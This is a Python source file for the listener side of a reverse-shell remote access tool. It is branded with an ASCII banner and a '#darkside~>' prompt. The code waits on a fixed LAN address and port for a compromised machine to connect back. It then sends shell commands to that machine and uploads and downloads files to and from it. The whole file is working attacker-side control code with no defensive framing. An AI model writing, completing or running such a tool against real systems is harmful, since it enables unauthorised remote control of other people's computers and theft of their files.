import socket
import json
import base64


class Listener:
    def banner(self):
            bann = '''
              .__       .__         __________        __   
   _________  |__| ____ |  |__  __ _\______   \____ _/  |_ 
  / ___\\__  \\ |  |/ ___\\|  |  \\|  |  \\       _|__  \\   __\\
 / /_/  > __ \|  \  \___|   Y  \  |  /    |   \/ __ \|  |  
 \___  (____  /__|\___  >___|  /____/|____|_  (____  /__|  
/_____/     \/        \/     \/             \/     \/      
                        Coded by 6eng6ar :)

                        
                    '''
            return bann

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print(self.banner())
        print("[+] Listening for connections ...")
        self.conn, address = listener.accept()
        print("[+] Got connection from " + str(address))

    def jsend(self, data):
        jsond = json.dumps(data)
        jsond = jsond.encode("UTF-8")
        self.conn.send(jsond) 

    def jrecv(self):
        jsond = "".encode()
        
        while True:
            try:
                jsond = jsond + self.conn.recv(1024)
                return json.loads(jsond) 
            except ValueError:
                continue

    def execComm(self, comm):
        self.jsend(comm)
        if(comm[0] == "exit"):
            self.conn.close()
            exit()   
        return self.jrecv()

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
        return "[+] Download successful :)"
    
    
    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def run(self):
        while True:
 
            command = input("#darkside~>")
            command = command.split(" ")
            try:
                if (command[0] == "upload"):
                    content = (self.read_file(command[1])).decode("utf-8")
                    command.append(content)
                result = self.execComm(command)
                if(command[0]=="download" and "[-] Error " not in result):
                    result = self.write_file(command[1], result.encode("utf-8"))
            except Exception:
                result = "[-] Error executing"
                
            print(result)


server = Listener("192.168.0.15", 7001)
server.run()



